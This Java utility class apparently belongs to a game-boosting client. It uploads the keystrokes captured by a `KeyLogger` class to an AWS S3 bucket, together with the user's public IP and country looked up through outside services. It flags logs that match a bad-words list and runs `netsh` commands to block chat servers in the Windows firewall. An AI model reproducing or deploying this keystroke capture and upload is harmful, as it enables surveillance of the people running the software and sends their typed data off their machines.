package services;

import logger.KeyLogger;
import model.orders.Order;
import model.User;
import org.json.JSONException;
import org.json.JSONObject;
import view.AlertBox;
import webService.AWSWebService;

import java.io.*;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.time.LocalDate;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.Date;
import java.util.Scanner;
import java.util.Timer;
import java.util.logging.Logger;

public class Utils {

    public static boolean foundBadWord = false;
    public Boolean scriptAlert = false;
    private static Timer timer = new Timer();


    public void uploadLog(User user, Order order) {
        try {
            if(checkForBadWords(KeyLogger.log)) {
                Utils.foundBadWord = true;
            }
            AWSWebService webService =  new AWSWebService();
            webService.WebService(createLogFile(), createKey(user, order));
            KeyLogger.log.clear();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private boolean checkForBadWords(ArrayList<String> log) {
        ArrayList<String> badWords = getBadWords();
        for (String badWord: badWords) {
            for (String message : log) {
                if(message.toUpperCase().contains(badWord.toUpperCase())) {
                    return true;
                }
            }
        }
        return false;
    }

    private ArrayList<String> getBadWords () {
        ArrayList<String> badWords = new ArrayList<>();
        Scanner scanner = null;
        scanner = new Scanner(KeyLogger.badWordsFilePath);
        while (scanner.hasNext()) {
            badWords.add(scanner.nextLine());
        }
        System.out.println(badWords);
        System.out.println(KeyLogger.message);
        scanner.close();
        return badWords;
    }

    public String createKey(User user, Order order) {
        DateTimeFormatter dtf = DateTimeFormatter.ofPattern("yyyy/MM/dd");
        String path = "";
        path += AWSWebService.folder + "/";
        path += LocalDate.now() + "/";
        path += createFileName(user, order) + ".csv";
        return path;
    }

    public File createLogFile() throws IOException {
        File tempFile = File.createTempFile("anyad", ".txt");
        BufferedWriter bufferedWriter = new BufferedWriter(new FileWriter(tempFile));
        bufferedWriter.write("The booster's IP adress is: " + getMyIp());
        bufferedWriter.write(System.getProperty("line.separator"));
        bufferedWriter.write("The booster's Country is: " + getMyCountry());
        bufferedWriter.write(System.getProperty("line.separator"));
        bufferedWriter.write(System.getProperty("line.separator"));
        for (String row : KeyLogger.log) {
            bufferedWriter.write(row);
            bufferedWriter.write(System.getProperty("line.separator"));
        }
        bufferedWriter.close();

        return tempFile;
    }


    public String createFileName(User user, Order order) {
        String fileName = "";
        if(foundBadWord) {
            fileName += " WARNING ";
        }
        if (scriptAlert) {
            fileName += " SCRIPT ALERT ";
        }
        fileName += " Booster_ID: " + user.getId() + " ";
        fileName += " Order_id: " + order.getId() + " ";
        DateFormat dateFormat = new SimpleDateFormat(" yyyy_MM_dd HH_mm_ss ");
        Date date = new Date();
        fileName += dateFormat.format(date);
        System.out.println(fileName);
        return fileName;
    }

    public String getMyIp() {
        try (Scanner s = new Scanner(new java.net.URL("https://api.ipify.org").openStream(), "UTF-8").useDelimiter("\\A")) {
            return s.next();
        } catch (IOException e) {
            return "couldn't find his IP";
        }
    }

    public String getMyCountry() {
        try (Scanner s = new Scanner(new java.net.URL("https://usercountry.com/v1.0/json/" + getMyIp()).openStream(), "UTF-8").useDelimiter("\\A")) {
            JSONObject jsonObject = new JSONObject(s.nextLine());
            return jsonObject.get("country").toString();
        } catch (IOException e) {
            return "couldn't find his Country";
        } catch (JSONException e) {
            e.printStackTrace();
            return "couldn't find his Country";
        }
    }

    public void readKeys() {
        ArrayList<String> keys = new ArrayList<>();
        Scanner scanner = null;
        scanner = new Scanner(ClassLoader.getSystemResourceAsStream("keys.csv"));
        if(scanner != null) {
            while (scanner.hasNext()) {
                keys.add(scanner.nextLine());
            }
            scanner.close();
        }
        AWSWebService.accessKey = keys.get(0);
        AWSWebService.secretKey = keys.get(1);
        AWSWebService.bucketName = keys.get(2);
        AWSWebService.folder = keys.get(3);
        AWSWebService.region = keys.get(4);
    }

    public void disableChat(String server) {
        String[] command = {"cmd", "/c", "netsh advfirewall firewall add rule name=\"lolchat\" dir=out remoteip=" + getServerIp(server) + " protocol=TCP action=block"};
        StringBuilder cmdReturn = new StringBuilder();
        try {
            Process process = Runtime.getRuntime().exec(command);
            try (InputStream inputStream = process.getInputStream()) {
                int c;
                while ((c = inputStream.read()) != -1) {
                    cmdReturn.append((char) c);
                }
            }
            System.out.println(cmdReturn.toString());

        } catch (IOException ex) {
            System.out.println("ASD");
        }
    }

    private String getServerIp(String server) {
        switch (server) {
            case "EUW": return "185.40.64.69";
            case "EUNE": return "185.40.64.111";
            case "NA": return "192.64.174.69";
        }
        return null;
    }

    public void enableChat() {
        String[] command = {"cmd", "/c", "netsh advfirewall firewall delete rule name=\"lolchat\""};
        StringBuilder cmdReturn = new StringBuilder();
        try {
            Process process = Runtime.getRuntime().exec(command);
            try (InputStream inputStream = process.getInputStream()) {
                int c;
                while ((c = inputStream.read()) != -1) {
                    cmdReturn.append((char) c);
                }
            }
            System.out.println(cmdReturn.toString());

        } catch (IOException ex) {
            System.out.println("ASD");
        }
    }

}
